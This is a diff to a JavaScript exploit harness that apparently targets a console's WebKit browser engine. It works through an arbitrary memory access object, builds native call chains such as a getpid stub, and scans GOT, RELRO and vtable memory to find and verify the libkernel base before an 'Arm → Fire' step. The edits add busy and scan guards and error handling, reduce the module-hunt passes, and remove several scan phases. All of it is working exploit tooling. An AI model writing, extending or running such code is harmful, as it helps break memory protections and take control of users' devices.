@@ -53,7 +53,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831v";
+const BUILD_ID = "rw-20250831w";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -559,7 +559,12 @@ const MANUAL_TESTS = [
 ];
 
 function runManualTest(testId) {
-    if (!ready || !window.p || busy) return;
+    if (!ready || !window.p) return;
+    if (busy && testId !== "verify-lk" && testId !== "force-lk" && testId !== "paste-lk") {
+        mark("SKIP", "busy — Stop find or wait");
+        renderOut();
+        return;
+    }
     const p = window.p;
     const off = loadEffectiveOff();
     const { nativeFn, webkitBase, libkernelBase } = basesFromSession(off);
@@ -1994,7 +1999,15 @@ function runTryCalPtrs() {
 }
 
 function runVerifyLk() {
-    if (!ready || !window.p || busy) return;
+    if (!ready || !window.p) return;
+    if (findLkAuto) {
+        mark("LK-SKIP", "Scan GOT still running — Stop find first");
+        renderOut();
+        return;
+    }
+    mark("LK-VERIFY", "start build=" + BUILD_ID);
+    renderOut();
+
     const p = window.p;
     const off = loadEffectiveOff();
     const { webkitBase } = basesFromSession(off);
@@ -2005,73 +2018,77 @@ function runVerifyLk() {
     }
     if (!hex) {
         mark("LK-SKIP", "hex empty — Scan GOT lite first");
+        renderOut();
         return;
     }
     const ptr = parseAddr(hex);
     if (!ptr) {
         mark("LK-SKIP", "bad hex");
-        return;
-    }
-
-    const passNames = ["mod96", "mod192", "mod256"];
-    const passPages = [96, 192, 256];
-    const pass = extResolveIdx % passNames.length;
-    const isAlignedBase = (ptr.low & 0x3fff) === 0;
-
-    if (isAlignedBase) {
-        const vBase = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
-        if (vBase.ok && vBase.strong) {
-            saveLibkernelSession(ptr, null);
-            mark("LK-VERIFY-OK", String(ptr) + " stub+" + vBase.stubOff.toString(16) + " build=" + BUILD_ID);
-            state("lk verified — Arm → Fire", "ok");
-            renderOut();
-            crashLog.append("VERIFY OK " + hex, "LK-VERIFY");
-            crashLog.flushSync();
-            return;
-        }
-        if (vBase.ok) {
-            saveLibkernelSession(ptr, null);
-            mark("LK-VERIFY-WARN", String(ptr) + " " + (vBase.warn || "weak"));
-            state("weak lk — Force lk → Arm → Fire", "warn");
-            renderOut();
-            crashLog.flushSync();
-            return;
-        }
-    } else {
-        mark("LK-EXT-FN", hex + " import — mod-hunt " + passNames[pass] + " (no k__error)");
-    }
-
-    const resolved = resolveExtModuleHunt(p, ptr, webkitBase, off, passPages[pass]);
-    if (resolved) {
-        saveLibkernelSession(resolved.lk, resolved.iatRva);
-        if (addrIn) addrIn.value = String(resolved.lk);
-        const v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
-        const kLog = resolved.k__error != null ? " k=0x" + resolved.k__error.toString(16) : "";
-        const stubLog = resolved.stubs != null ? " stubs=" + resolved.stubs : "";
-        if (v.ok && v.strong) {
-            mark("LK-VERIFY-OK", String(resolved.lk) + " via " + resolved.via + kLog + stubLog + " build=" + BUILD_ID);
-            state("lk verified — Arm → Fire", "ok");
-        } else if (v.ok) {
-            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + stubLog + " — " + (v.warn || "weak"));
-            state("weak lk — Force lk → Arm → Fire", "warn");
-        } else {
-            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + stubLog + " — stub hunt");
-            state("weak lk — Force lk → Arm → Fire", "warn");
-        }
-        mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via + kLog + stubLog);
         renderOut();
-        crashLog.append("VERIFY OK " + hex + " → " + resolved.lk, "LK-VERIFY");
-        crashLog.flushSync();
         return;
     }
 
-    mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass]
-        + " — vtable ext may not be libkernel on poops");
-    cycleExtPtrInHex();
-    state("verify miss — tap again (cycles ptr + pass)", "bad");
-    renderOut();
-    crashLog.append("VERIFY FAIL " + hex + " " + passNames[pass], "LK-VERIFY");
-    crashLog.flushSync();
+    try {
+        const passNames = ["mod12", "mod16"];
+        const passPages = [12, 16];
+        const pass = extResolveIdx % passNames.length;
+        const isAlignedBase = (ptr.low & 0x3fff) === 0;
+
+        if (isAlignedBase) {
+            const vBase = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
+            if (vBase.ok && vBase.strong) {
+                saveLibkernelSession(ptr, null);
+                mark("LK-VERIFY-OK", String(ptr) + " stub+" + vBase.stubOff.toString(16) + " build=" + BUILD_ID);
+                state("lk verified — Arm → Fire", "ok");
+                renderOut();
+                crashLog.append("VERIFY OK " + hex, "LK-VERIFY");
+                crashLog.flushSync();
+                return;
+            }
+            if (vBase.ok) {
+                saveLibkernelSession(ptr, null);
+                mark("LK-VERIFY-WARN", String(ptr) + " " + (vBase.warn || "weak"));
+                state("weak lk — Force lk → Arm → Fire", "warn");
+                renderOut();
+                crashLog.flushSync();
+                return;
+            }
+        } else {
+            mark("LK-EXT-FN", hex + " import — " + passNames[pass]);
+        }
+
+        const resolved = resolveExtModuleHunt(p, ptr, webkitBase, off, passPages[pass]);
+        if (resolved) {
+            saveLibkernelSession(resolved.lk, resolved.iatRva);
+            if (addrIn) addrIn.value = String(resolved.lk);
+            const v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
+            const stubLog = resolved.stubs != null ? " stubs=" + resolved.stubs : "";
+            if (v.ok && v.strong) {
+                mark("LK-VERIFY-OK", String(resolved.lk) + " via " + resolved.via + stubLog + " build=" + BUILD_ID);
+                state("lk verified — Arm → Fire", "ok");
+            } else {
+                mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + stubLog);
+                state("weak lk — Force lk → Arm → Fire", "warn");
+            }
+            mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via + stubLog);
+            renderOut();
+            crashLog.append("VERIFY OK " + hex + " → " + resolved.lk, "LK-VERIFY");
+            crashLog.flushSync();
+            return;
+        }
+
+        mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass]);
+        cycleExtPtrInHex();
+        state("verify miss — tap again", "bad");
+        renderOut();
+        crashLog.append("VERIFY FAIL " + hex + " " + passNames[pass], "LK-VERIFY");
+        crashLog.flushSync();
+    } catch (err) {
+        mark("LK-VERIFY-ERR", err.message || String(err));
+        state("verify error", "bad");
+        renderOut();
+        crashLog.flushSync();
+    }
 }
 
 let extResolveIdx = 0;
@@ -2180,7 +2197,7 @@ function finishFindLkChunk(chunk) {
             crashLog.flushSync();
 
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Scan GOT lite hunts stubs (no dump/k__error) — or Verify lk");
+            mark("LK-HINT", "Verify lk — mod12/mod16 per ext ptr (manual)");
             mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
@@ -2236,7 +2253,7 @@ async function runFindLkAuto(preset) {
         knownExtPtrs: [],
     }, findLkPreset);
     let loops = 0;
-    const loopMax = findLkPreset.lite ? 200 : 120;
+    const loopMax = 120;
 
     try {
         while (findLkAuto && !findLkStop && loops < loopMax) {
@@ -2259,22 +2276,7 @@ async function runFindLkAuto(preset) {
             else if (chunk.phase === "vt-miss" && chunk.cellDbg && chunk.cellDbg.length)
                 mark("LK-CELL-DBG", chunk.cellDbg.join(" | ").slice(0, 240));
             else if (chunk.phase === "vt-done")
-                mark("LK-GOT", "vtable ext=" + (chunk.ext || 0) + " — elf-ext stub hunt");
-            else if (chunk.phase === "elf-ext-start")
-                mark("LK-ELF-EXT", "mod hunt n=" + chunk.total + " (SCE/stub score, no k__error)");
-            else if (chunk.phase === "elf-ext")
-                state("Scan GOT elf-ext " + (chunk.idx || 0) + "/" + (chunk.total || "?")
-                    + " tried=" + (chunk.tried || 0), "warn");
-            else if (chunk.phase === "elf-ext-hit" || chunk.phase === "elf-ext-best")
-                mark("LK-ELF-EXT-OK", (chunk.source || chunk.phase)
-                    + " stubs=" + (chunk.stubs != null ? chunk.stubs : "?"));
-            else if (chunk.phase === "elf-ext-done")
-                mark("LK-GOT", "elf-ext miss — poops RELRO hunt");
-            else if (chunk.phase === "relro-poops-start")
-                mark("LK-RELRO", chunk.span || "poops RELRO");
-            else if (chunk.phase === "relro-poops" || chunk.phase === "relro-poops-region")
-                state("Scan GOT relro +0x" + (chunk.cursor != null ? chunk.cursor.toString(16) : "?")
-                    + " tried=" + (chunk.tried || 0), "warn");
+                mark("LK-GOT", "vtable ext=" + (chunk.ext || 0) + " — use Verify lk");
             else if (chunk.phase === "abs-start")
                 mark("LK-GOT", "abs RELRO " + chunk.from + "…" + chunk.to);
             else if (chunk.phase === "abs-done")
